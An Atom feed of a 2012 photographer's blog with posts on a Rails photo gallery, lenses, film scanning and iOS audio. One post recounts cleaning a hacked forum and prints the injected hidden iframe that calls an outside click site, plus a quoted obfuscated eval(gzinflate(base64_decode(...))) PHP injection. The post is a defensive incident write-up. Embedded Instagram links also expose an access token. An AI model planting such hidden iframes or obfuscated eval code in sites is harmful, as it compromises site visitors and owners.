<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: agalmic | DV Digital]]></title>
  <link href="http://www.dan-vidal.com//blog/categories/agalmic/atom.xml" rel="self"/>
  <link href="http://www.dan-vidal.com//"/>
  <updated>2012-11-01T03:08:21-04:00</updated>
  <id>http://www.dan-vidal.com//</id>
  <author>
    <name><![CDATA[Dan Vidal - Pod]]></name>
    <email><![CDATA[dan@dan-vidal.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[The virtues of open-source...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/29/the-virtues-of-open-source-dot-dot-dot/"/>
    <updated>2012-10-29T13:12:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/29/the-virtues-of-open-source-dot-dot-dot</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/ruby.png" width="679" height="410" title="'Coding'" ></p>

<p>Sorry about the dearth of updates over the past few days. The wedding edit took some time, as well as real-life things having to happen as well. And then Halloween. The biggest, most interesting challenge, however, was the selection and deployment of a web application to display the edited photos from Tal and Erick's wedding...</p>

<!-- more -->


<p>The edit itself went flawlessly. With my MacBook Air being a completely solid-state system, the actual rendering and editing took no time at all. Any time spent was purely on creative decisions. Protip - double-check that your sensor is clean. Cloudless blue skies make for wonderful wedding backdrops, but every little dust particle shows up. And the ultrasonic cleaner will not get them all. I spent a good amount of time spotting each photo. I usually check my sensor, but my MK II has the cleaning system, so I thought nothing of it. Wrong. Dust still adheres to the sensor surface.</p>

<p>I teased the bride and groom with little Instagram previews of my progress. It was a photo of a photo, but they got a kick out of it.</p>

<p><p><a href='/blog/2012/10/23//' data-instagram-url='http://instagr.am/p/RJTU0XAgCa/' class='instagram-image'><img src='http://distilleryimage2.s3.amazonaws.com/ba2799ba1d7311e2959322000a1e9e0c_7.jpg' alt='Your turn in the render render @simply_sarah7' height='612' width='612' /></a><br/>Filtered with <a href='/blog/categories/normal'>Normal</a> through <a href='/blog/categories/instagram'>Instagram</a></p><!--more--><p><a href='http://maps.google.com?q=25.835181305,-80.182557106'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.835181305,-80.182557106&markers=25.835181305,-80.182557106&zoom=14&size=612x200&sensor=false' alt='Talk Nightlife' /></a><br/>Taken at Talk Nightlife</p><p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='308863042945417370_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p></p>

<p>Finally, I completed the edit, and then had to tackle the task of how best to display the photos.</p>

<p>Now, the obvious solution would have been to just use a canned solution like Flickr, or 500 px. While both services have their strong points, the fact that I don't have direct control over my content did give me cause for concern. Plus, with my recent forays into the world of building web applications and coding, I wanted to roll my own solution as much as possible.</p>

<p>Initially, I wanted to present the site via Octopress. I have experience in Octopress now, because of this blog, and several photo display plugins have been written for the platform.</p>

<p>I had done some research, and found that the web app <a href="http://fancyapps.com/fancybox">Fancybox</a> integrated somewhat smoothly with Octopress. Also, a fellow Octopress user, <a href="http://tritarget.org/blog/2012/05/07/integrating-photos-into-octopress-using-fancybox-and-plugin/">Tritarget</a> had written a pretty good plugin which made the display of photos even easier, since it utilized simple Markdown tags, rather than coding raw HTML.</p>

<p>To make things easy, and not interfere with the operation of this blog, I chose to spin up another instance on my <a href="http://heroku.com/">Heroku</a> account. Heroku is the ideal choice for this and other projects of mine because I can spin up as many instances as I want, and only accrue charges for the total amount of resources (regardless of the number of apps) that I consume. After a little tweaking and adjustments, I got Fancybox and the plugin to play nice with Octopress.</p>

<p>Fancybox is probably the best-looking HTML-based photo display app out there. Slick transitions, a great UI, and easy implementation (mostly), make for a great quick-and-dirty display solution. However, the downside is, there is no practical way, that I found, to do a "gallery". And a gallery was needed since my final edit came to 530 photos.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/preview_collage.jpg" width="960" height="960" title="'Previews'" ></p>

<p>And I certainly wasn't going to manually input the Markdown tags for 530 photos. So, with that in mind, I decided to divest my thoughts of using Octopress. I set out to find a dedicated photo display solution. Some enterprising individuals had written plugins which can read Flickr sets, but I didn't want to host on Flickr, for copyright and personal reasons. So, I googled around a bit and found several Rails-based photo gallery apps.</p>

<p>Now, some of you may ask, why wouldn't I just use the Rails-based photo gallery app that I had already, i.e. <a href="http://seenightlife.com/">See Nightlife</a>?</p>

<p>Well, to be honest, See Nightlife is broken. I can upload and display, but all organizational tools are offline. It's a "write once" solution as it stands. I can't even delete photos. Also, Ryan and I simply haven't had the time to fix it. Plus, the app it was based on, <a href="https://github.com/rapind/albumdy">Albumdy</a> is no longer being maintained.</p>

<p>As this was to display the wedding photos of two of my closest friends, something a little more reliable needed to be found. These are wedding photos, not a bunch of images of kids blindly worshipping some guy playing music off of his Mac.</p>

<p>So, with that in mind, I settled on a fairly popular Rails app called <a href="http://balderapp.com/">Balder.</a></p>

<p>Developed and maintained by Espen Antonsen out of Norway, Balder is a currently-maintained-and-produced Rails app for displaying photos in a collection/album format. And it fit my use case perfectly, as I wanted to host my photos on S3, and have the app live on Heroku. Heroku is more for running applications, and not storage. S3 is eminently more suited to storage, hence "Simple Storage Service" (S3). Espen himself uses this setup, and even provided a howto guide <a href="http://blog.inspired.no/rails-photo-gallery-balder-on-heroku-and-s3-726/">on his blog</a> on how to do it. In a nutshell, you provide Balder your S3 key, secret, and bucket name in a config file, commit to Heroku, and go from there. The one stumbling block I encountered is that the uploader itself tries to call an EXIF display module, which is dependent on a UNIX executable, which to my knowledge, cannot be installed on Heroku. So, even though the initial deployment was fast, the actual implementation wasn't.</p>

<p>Now, where the virtues of open source kick in is that I had the code for Balder on my local machine. Through Heroku's logging, I could see where the app was breaking uploads. I'm still a 'babe in the woods' when it comes to coding, but I can read what the code is doing. I saw where it was getting hung up, but had no idea on how to fix it, or comment it out, since I specifically didn't need EXIF data to be displayed. For those who may not be familiar, EXIF data is basically metadata contained in a JPEG file, which shows things like the camera type, exposure settings, and so on. You can see the EXIF data of a photo by doing the "File Info" function on your operating system of choice.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/exif.png" width="964" height="541" title="'Coding'" ></p>

<p>So, via the <a href="https://github.com/espen/balder">issues tracker in the Github repository for Balder</a>, I submitted a request for support from the developer. Now, since the app is free, and Espen derives no income from it, he was under zero obligation to respond to me. Since it was the weekend, I didn't expect much right away. But, by this morning, he had filed a response to my request:</p>

<p><blockquote><p></p></p><p><p>Try commenting out "before_create :exif_read" in the photo model. I will look into this later but currently too busy with other work.</p></p><p><p></p><footer><strong>Espen Antonsen</strong> <cite><a href='https://github.com/espen/balder/issues/36'>HTML5 Uploader Generates HTTP Error</a></cite></footer></blockquote></p>

<p>I appreciated his honesty, that's for sure. Way more than I expected. Most free open-source projects are one-shot deals where the developer does the initial work, and then forgets about it. So, I was pleasantly surprised at a reply.</p>

<p>And fortunately, his solution worked. I commented out a call to the non-existent EXIF module, and successfully uploaded some photos as a test. After confidently seeing that they displayed and cycled according to my wishes, I then began to upload the wedding photos in earnest. Balder has an excellent organizational structure. I can create a collection, let's call it "Wedding", and then albums for each portion of the event. Very slick. Five stars. And wonderful support from someone whom isn't even obligated to do so.</p>

<p>Now, if this was a closed-source solution or a problem with a hosted service like Flickr, I would have had no way of figuring out what was wrong. I would have had to email their support, wait, and hope they could get to the issue in time. With open-source, I can peek under the hood, make some educated assessments as to what the issue is, and attempt a fix on my own. Or at the least, get concrete info that the developer understands so he or she can make a more effective fix. Plus, I got to learn a little more about just what makes a Rails-based web app tick.</p>

<p>Right now, the app is deployed to Heroku, and running smoothly. I plan on using Balder in general, from here on out and whenever possible for my hosting needs. Open source for the win, as they say.</p>

<ul>
<li>Sidebar: I'd love to show you guys the results of the wedding, but since it was a personal affair, I would rather receive clearance before I share the results with the public. Thanks for understanding, all.</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Shooting video wide open.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/10/shooting-video-wide-open/"/>
    <updated>2012-10-10T12:41:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/10/shooting-video-wide-open</id>
    <content type="html"><![CDATA[<iframe src="http://player.vimeo.com/video/51143544" width="720" height="480" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<p> <p><a href="http://vimeo.com/51143544">• 50 1.2 L video test wide open at 1.2 •</a> from <a href="http://vimeo.com/dvdigital">Dan V</a> on <a href="http://vimeo.com">Vimeo</a>.</p></p>

<p>Shooting video using the 50 1.2 L is an interesting experience, to say the least...</p>

<!-- more -->


<p>One of the biggest things cinematographers and videographers, such as <a href="http://watcha3.com/">Buster</a> over at A3, have conveyed to me, is the desire to shoot at the lowest ISO possible when shooting video, preferably below ISO 1000, though I have gotten great results at ISO 1600, and I'll go beyond that, if I know the video is going to be laden with effects in post.</p>

<p>That being said, the obvious requirement to shoot at a low ISO is, lots of light. And "lots of light" in the video world, means something a bit different than in the world of still photography, for a few reasons.</p>

<p>First off, due to the nature of video, you are limited to a shutter speed, at the low end, of 1/30 second. Though, for the best results, most videographers, including <a href="http://blog.vincentlaforet.com">Vincent Laforet</a>, recommend a shutter speed of 1/50 second, to mesh better with common monitor refresh rates. So, almost by default, you are limited in your light gathering ability, when shooting video.</p>

<p>At that point, your options are, crank the ISO, open up as fast as your lens can go, or dump a lot of light on the scene. Or any combination thereof.</p>

<p>As an experiment, I chose to shoot the sequence above at ISO 320, 1/50 second shutter speed, all wide open at f1.2. As you can see, Caroline drifts in and out of the zone of critical focus on numerous occasions. However, the video quality is amazing. At ISO 320, the 5D MK II generates superb results. In reality I could have stopped down a bit, since the lighting tech at Blue Martini was kind enough to have the system running at maximum intensity at the time.</p>

<p>I can definitely recommend the 50 1.2 L for video work. It's a very versatile prime, and the image quality is amazing.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Film might be archival, but...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/04/film-might-be-archival/"/>
    <updated>2012-10-04T01:53:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/04/film-might-be-archival</id>
    <content type="html"><![CDATA[<p><p><a href='/blog/2012/10/04//' data-instagram-url='http://instagr.am/p/QWWPj8AgIZ/' class='instagram-image'><img src='http://distilleryimage1.s3.amazonaws.com/ea00a4d40de611e28b0122000a1f8e95_7.jpg' alt='The man @tiesto in 2002 #wmc #miami - hah Nick set this one up for me, told me to see "this guy" at some hotel on the beach. #throwbackthursday' height='612' width='612' /></a><br/>Filtered with <a href='/blog/categories/lord kelvin'>Lord Kelvin</a> through <a href='/blog/categories/instagram'>Instagram</a></p><!--more--><p><a href='http://maps.google.com?q=25.788277,-80.130787'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.788277,-80.130787&markers=25.788277,-80.130787&zoom=14&size=612x200&sensor=false' alt='Aqua Hotel' /></a><br/>Taken at Aqua Hotel</p><p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='294520652042469913_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p></p>

<p>Even though I think social networking is mainly a lot of hype, snake oil, and the dumbing down of the narcissistic masses even further, I'll gladly admit my addiction to Instagram. At least to do something meaningful with it, you have to overcome the limitations of your iPhone camera, and go for what's there. It's part of the challenge, to me. Plus, I like the UI and the way it sends your photo while you think of some pithy caption, so it almost appears to upload at warp speed.</p>

<p>There's a trend on Instagram, called "Throwback Thursday". Well, it's Thursday right now. So I like to do throwbacks when I can.</p>

<p>I first saw this when I jumped on Instagram a few months ago. People would post photos from their past, and call them "throwbacks". Now, of course, the limit of the throwback is tied to the age of the image that is being posted. And, most images being posted are straight from a digital source. And unless you were in the photo biz, you had no easy way to digitize your old film shots.</p>

<p>When I shot film, I had a film scanner. Not a flatbed to scan prints, which was essentially making second-generation copies, but a full-on "digital enlarger", which actually had 1/3 the resolution of my current digital SLR, oddly enough. It was a Minolta unit, which actually was old when I bought it, and required me to get an equally-old <em>SCSI</em> (remember SCSI?) adapter card for my homebuilt PC to make it work. It was painfully slow. An average photo session from a club took about 3 hours to scan in if I wanted the proper results.</p>

<p>As time went on, I obviously upgraded to digital (in mid-2003 no less!) with a Canon 10D DSLR. I stowed my Minolta scanner, and actually never touched it again. By the time it occurred to me that maybe I'd want a film scanner to bring back some of those old archived images, it was well past the time when I even had a desktop PC with which it could be used. I had migrated to Apple, and obviously my Macbook had only USB and Firewire ports. Yes, I know Nikon, Imacon, and others make USB and Firewire film scanners, but, economies of scale did not touch them, and they were still as expensive and as rare as the days they were a common item in professional photo labs around the world. There were some cheap brand-X scanners on eBay, but the results were disappointing. And I wasn't about to ship my negatives and chromes to New York, just to have them scanned in. No one is asking for the old stuff for any commercial reasons, anyways, i.e. I couldn't warrant a film scanner purchase just for social media use.</p>

<p>Now, I know what is being asked, "Hey, Pod, didn't you save the files you made from the scans?"</p>

<p>Well, actually I only saved the final JPEG files, which in those days I only saved them at 320 px across in the long dimension to fit the specs for CJ. It wasn't worth saving the TIFF files since if I was printing, I would just do it at the pro lab I worked at at the time on their Frontier system or traditional darkroom. And the only reason to go to TIFF was for archival reasons, and if you had the negs and chromes (which I do), you already had an archive. However, that archive might as well be on the moon as far as quickly accessing it is concerned.</p>

<p>That being said, I did a fun trick for the Tiësto image at the start of this article. That one is from 2002. Nick sent me out to this Nettwerk America record label event at the Aqua Hotel on Collins Avenue, to take photos of "this Tiësto guy", while a writer he drafted interviewed him. Hah, the days of real interviews.</p>

<p>Anyways...what I did to get this "digital" was that I made a pure white block on my Macbook Air's monitor, and laid the chrome of Tijs over it. The white light shines through the chrome, making it visible. Then I used my iPhone camera to take a photo of the chrome laid over the white block. Insta-lightbox-low-res-social-media-scanner. And if you want to do a "scan" of a negative, you just do the same thing, export to Photoshop, invert the colors, do some balancing, and you've got yourself a quick and dirty capture of an old analog image. It's not Imacon quality (but then again, what else is?), but to impress all your friends and mindless followers on Instagram, it's definitely sufficient. A step up would be to rig up your DSLR and do it at a higher resolution. However, then you are picking up the individual elements of the screen unless you have a Retina display. At that point you should probably just secure a lightbox from eBay. Hmm, wait...</p>

<p>Since this blog is partially educational, I'm putting this idea out to the community free of charge. All I ask is if you use this technique, just tag your Instagrams with #podscan and @pod_gram. Attribution is always welcome, and it's what people used to do. Your image and caption can be a throwback!</p>

<p>Happy Throwback Thursday.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Getting the best sound from your iDevices.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/03/getting-the-best-sound-from-your-idevices/"/>
    <updated>2012-10-03T01:28:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/03/getting-the-best-sound-from-your-idevices</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/eq.jpg" width="640" height="960" title="'EQ'" ></p>

<p>Being able to take a significant portion of, or the entirety of, your audio library on the road is a wonderful thing. Of course the primary means of doing this for most people is via their iPhone, iPod, or iPad. And, I suppose, some people draft their Android devices into unwilling audio playback devices. And there's probably one person who uses their BlackBerry for this function, maybe. Regardless, iDevices reign supreme nowadays for mobile audio. And, Apple themselves have a host of applications for the Mac, dedicated to making the best audio possible.</p>

<p>Then, why are the default audio optimization options for iOS so miserable?</p>

<!-- more -->


<p>That does baffle me. Apple, as a company, develops and produces applications like <a href="http://www.apple.com/logicpro/">Logic Pro</a>, which is a well-regarded audio production application. But I guess that side of the house doesn't liase with the side of Apple dedicated to their mobile devices. The EQ options never are 100% perfect, and the included earbuds, even the new "EarPods", are horrendous.</p>

<p>So, what's a picky audiophile on-the-go to do?</p>

<p>Surprisingly, car audio is easy. Any decent head unit nowadays has an iOS-compatible USB port, and some manufacturers include iOS compatibility in their stock systems. The huge advantage here is that your iDevice turns into a mere storage unit, and all the decoding and heavy lifting is done in the head unit of your car.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof-7823.jpg" width="960" height="640" title="'DEH-4400'" ></p>

<p>In general, the digital-to-analog converter (DAC) in your car's head unit, is superior in quality to the one that ships with an iDevice. It's a $2 part, that probably does a lot of other things as well, in your iPod, and in your Pioneer head unit, for example, it's a $10 discrete component. The advantage here is that your iDevice sends the audio as pure data, and you can then use your head unit's more precise EQ (even a three-band one helps!) for better audio quality.</p>

<p>Now, we're not always in our cars when we're on the go. In an urban area we might be on a bus, walking, jogging, or cycling. Fortunately, one can acquire a decent pair of earbuds for under $60. I'm not going to really argue which one is superior here, since everyone's hearing is different. I personally use the <a href="http://www.polkaudio.com/products/ultrafit500">Polk Audio UF500s.</a> They come with several bud attachments so they're not flying away in the middle of a workout, for example. At a certain point a headphone is a headphone is a headphone when it comes to in-ear types. If I'm doing critical listening I'll have a pair of studio cans like the Sony MDR-7509s (say no to celebrity headphones!) handy.</p>

<p>But, even the best headphones need a good signal to work with it. And on an iDevice, the default EQ options don't cut it. So I did some poking around, and i found several apps. The one that "stuck" with me the most was <a href="http://itunes.apple.com/us/app/equ-the-quality-equalizer/id403704212?mt=8">EQu</a>.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/ozz.jpg" width="640" height="960" title="'EQu'" ></p>

<p>Developed by <a href="http://www.elephantcandy.com/">elephantcandy</a> out of Amsterdam, EQu gives you a full graphic-equalizer control for your iDevice. You can use one of the many available preset EQ curves, or roll your own. I like crisp lows and well-defined highs (without getting too technical), and this little app let me do it. Your iOS presets usually sacrifice one for the other. But this app gives you full control, beyond even having a bunch of faders. In a nutshell, I get decent quality audio, while I'm on the go. More than sufficient for mobile use. I won't power a sound system out of my headphone port with this app, but I'll gladly use this while running or cycling. The app was last updated in July of 2012, so while it isn't explicitly optimized for the iPhone 5 or iOS 6 yet, it will work on the 5, or a device running iOS 6. The developer appears to still be in business, so I'm sure a new version is forthcoming.</p>

<p>But, that being said, it does reveal one weakness, and that's the inherent flaws in the files themselves. I've noticed on some of my songs purchased from the iTunes Music Store, that the low end tends to distort when amplified. You can actually view this in action on the app, it will flash red if the signal is peaking in any respect. However, I do have some straight WAV files from Beatport, which come through with their full fidelity in this app. The app definitely exposes the weaknesses of compressed audio. Shit in, shit out, as they say. Also, the app only works with your music files. Any other audio from any other app/source on your iDevice is subject to the defaults in iOS.</p>

<p>Some users report increased battery consumption with this app. That may be the case, but I'm usually never using it for more than two hours, and it performs just fine in my unscientific testing. Also, any ITMS file purchased before 2009 may not play back due to Apple's DRM at the time, since the app is it's own audio player, and not an EQ for the existing iOS playback app.</p>

<p>A third option exists, for the truly hardcore mobile audiophiles, the <a href="http://v-moda.com/vamp/">VAMP by V-MODA</a>. I had the pleasure during the 2009 Tiësto tour to spend time with Val Kolton, the founder of V-MODA, and he definitely takes his audio seriously. The Vamp reflects this. It's an external DAC/amplifier for the iPhone/iPod, and also acts as a battery too. However, at $600, it's a little rich for my blood. And there's no model for the iPhone 5 yet. I may live a little and consider it after I upgrade, it seems like a badass option, and there are occasions where I'm around the apt and not wanting to disturb the neighbors with my speakers, but I do want mobility. Or for when I'm on a plane and have a pair of 7509s. I love the concept, but I'll reserve judgement until they roll one for the 5.</p>

<p>But, for those of us on a budget, a good pair of earbuds, and the EQu app are a great combo for when you're on the go. It's just too bad you have to spend extra money, whether it's for a head unit in your car with a USB port, the combination of EQu and a decent pair of earbuds, or going full-throttle with a VAMP, to get decent audio out of your iDevice. Apple has the chops in pro audio, it should trickle down to their iDevices. At the least, give us a systemwide graphic equalizer.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[On clicks, likes, and impressions...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/27/on-clicks/"/>
    <updated>2012-09-27T23:34:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/27/on-clicks</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/sneakz.png" width="960" height="472" title="'cURL'" ></p>

<p>Every so often, websites are hacked. Sometimes it's bad, sometimes it's harmless. The usual goal is to infect a viewer's computer with malware, perhaps to join a botnet or something to that effect. Though the ones that fall under the category of "harmless", are actually quite annoying. They are usually trying to drum up clicks, likes, and impressions on a specific site.</p>

<p>And this, ladies and germs, is why the statistics on clicks, likes, and impressions is such a skewed game these days. You can't trust them...</p>

<!-- more -->


<p>Why not?</p>

<p>Well, case in point. TNL was hacked a few days ago. It happens sometimes. The webhost, <a href="http://dreamhost.com/">Dreamhost</a> for TNL is known far and wide for it's cheap and bargain-basement hosting. And they pretty much give you unlimited everything for a few dollars a month. Now, they usually don't add scads of hardware to their clusters to do this, but they subdivide what they already have, much like a cheap motel. With all this subdividing comes a lot of issues, most notably the ability for hackers and script kids to "peer over the walls", as it were, and observe what else is going on on a given server. TNL resides on a shared host, with hundreds of other sites. TNL in and of itself is secure, but it's hard for us to enforce the security when the walls built by the host are not secure, and we do not have the permission to reinforce those walls.</p>

<p>So, people invariably get in.</p>

<p>I first noticed something was amiss when I could not login to the forum's administrative control panel. Well, I could login, but the page failed to render properly. I then noticed some suspicious redirects going on in my browser's status bar. The redirects were pointing towards a site called "clickspro.org". Now, since I helped build TNL, I know each and every aspect of it's functionality. And, clickspro.org was not part of that functionality. Plus, Ryan would not have implemented something new on TNL, since he is not really paid to do that, and if he did, he would have notified me, especially considering it's been over three years since TNL has explicitly seen any new features.</p>

<p>So, I started a little investigating.</p>

<p><strong>Disclaimer: I am not a real computer security expert. I just know things and get by with a little help from my friends. I assume no liability for what is below. Posting this to help the community. YMMV. Thanks!</strong></p>

<p>Random things of this nature have happened before, and usually the culprit is a line or two of code that is inserted at the top of a page. This code typically points to malware, but in this case, it didn't. I used the UNIX tool "cURL" to investigate. cURL will render an HTML document in your Terminal window at the code level. cURL is basically a command-line browser.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>podbookair:podpress pod$ curl http://forum.talknightlife.com/adm/index.php?sid=1c88841aa35bdee4c5aafca116f06513</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>This rendered the admin control panel for TNL in it's raw HTML format. Therein, I spotted the offending code:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;iframe width="10" height="10" style="visibility:hidden;position:absolute;left:0;top:0;" src="http://click.clickspro.org/feed/frames.php?uid=56&frames=3">&lt;/iframe>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>That does not belong.</p>

<p>So, I Googled various iterations of the offending code. This turned out to be a fairly new attack that PHP-based web applications were falling victim to, and not much was known about it other than it being benign and not malicious in intent.</p>

<p>I had an email exchange with Ryan on the subject, and he suggested it was involving Javascript. As it was late, the conversation kind of ended there. TNL was still functioning, but I was locked out of the cockpit, as it were.</p>

<p>The next day I chose to follow his line of reasoning. I looked around for Javascript files that did not belong. TNL is a complex, poorly-documented machine. Our fault, but it is what it is. I didn't find anything of note. The only Javascript files were legit, and needed for the operation of TNL.</p>

<p>I got back to Google. I found a random forum posting on the subject at that point, over on the <a href="http://community.mybb.com/thread-126714-post-917538.html#pid917538">support site for MyBB</a>, which is a cousin of phpBB, the software that drives TNL.</p>

<p><blockquote><p></p></p><p><p>Same here, damn idiot hacker writes into my WordPress index.php files these lines</p></p><p><p></p><footer><strong>adormind</strong> <cite><a href='http://community.mybb.com/thread-126714-post-917538.html#pid91753'>Unknown Iframe on Index Page, Site Redirecting to Other From Mobile</a></cite></footer></blockquote></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>eval(gzinflate(base64_decode('7L0HYBxJliUmL23Ke39K9UrX4HShCI&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>BgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvf&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>e6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8iivN063ctmiZvt36387&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>a8c+cXpxdlNcnKFH8e4p/Pdg9/4+THfiyv66r+/et8VdVtsbzY2rnDH6/qYt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>luffy4OK+zRZ5eFbN2/tlHuzsfpfO8uJi38nvTXpf5Zx9dFk0xKcqivX40L2&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>azfHm4qpqiLarlo2zSVOW6zQ/L/Lx9tHPYViv6l96sp599NG/b1aO7d6dlMX&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>075n+bVV2Nq/ri7nmez+5y3814NV/9Huti9tn9T3+hfPLZvY+OHt8V1I4+Bs&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>K/5DdO/p8AAAD//w==')));?>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Basically, it seems that it is possible to execute a Javascript function, and obfuscate it through base64. I'm not the best at security, but I remembered base64 from my USENET days, where files were encoded in that manner to facilitate speedy transmission and also ensure a modicum of obscurity. In a nutshell, USENET kids transferred porn this way to keep it on the down-low. If you don't know what USENET is, Google it.</p>

<p>So, with this knowledge, I looked at some of our PHP files. I was SSHed into TNL directly, and used nano, a basic text editor, to view the offending files.
<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hawks:~/talknightlife.com/forum> nano index.php</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/score.png" width="960" height="480" title="'Score!'" ></p>

<p>That garbage up top is the base64-encoded Javascript which was causing my issue. Deleted it. Saved, and my ACP functionality was restored.</p>

<p>TNL continues on as normal. Happiness is restored to the gossip shop. Thanks to Ryan for pointing me in the right direction.</p>

<p>What mystifies me though, and I'm finally getting to the point of this rant, is that to implement this, it took some doing. This wasn't a ten-second hack. Some damn kid in Manila took probably about a half-hour or more to do this, all for the sake of putting a script on TNL which would generate only a few random clicks to some weird website elsewhere.</p>

<p>A lot of effort, for little return. Clicks, likes, and impressions. It's all a bullshit game. Your site has 100000 hits. So what? How does that convert to something tangible? If it's an ecommerce site, are people buying anything? If it's a site based on content, are people reading it? What is the meaningful metric? Oh, you have 100000 fans on Facebook? So? You only know their names, if that! Facebook took away the ability to easily browse your fanbase years ago. That number is equally meaningless. And now you have to pay Facebook to broadcast your message to all of them. Which is good for Facebook, but not-so-good for you. Statistics on web properties are always hideously inflated. To be impressed by those numbers is foolish. I would rather have 1000 people who really are engaged by my content and my product, than 50000 people who only clicked because they were told to, or if those clicks were the result of a script.</p>

<p>It's sad that people actually pay for this sort of thing. It's why my tactic with regards to web properties I don't explicitly own or have control over is to get people off them as fast as possible. I'll use social media to my advantage, but my final tactic is to get people off of the social media network, and right where I can get at them one-on-one, i.e. on this very blog, or over on TNL. For the record I don't harvest emails for marketing or spam. I tend to let people contact me. I value the interaction bought about by someone who is genuinely interested in what I am saying or selling. I'd rather have that one loyal follower who will stay with me through the years because I treat them right and with respect, rather than as a commodity. I guess I'm the boutique shopkeeper with the little store off to your right, rather than the Wal-Mart. I don't play the stats game. I've opted out. I get a few score viewers here on a daily basis. But I know them, or at least of them. We have a dialog, a real relationship. Not a bunch of meaningless egocentric clicks and likes.</p>

<p>Besides, my real followers, when they do choose or need to do business with me, pay real money. The pennies from clicks and likes may add up over time, but the methodology is dishonest and distasteful. And, even if I didn't find it so, it's really annoying.</p>

<p>Give me the real data and content.</p>

<p>And to the kid in Manila? Sorry about that. I know you're just doing your job, and it's better than the alternative of street prostitution, but I have to look after my interests. If I could pay it forward, I would. Maybe I am, by doing my little part in kicking down the clicks conspiracy.</p>

<p>Sidebar: If you are here searching for the solution to the jsunpack base64 clickspro problem, welcome! Take a look around after you are done fixing your systems.</p>
]]></content>
  </entry>
  
</feed>
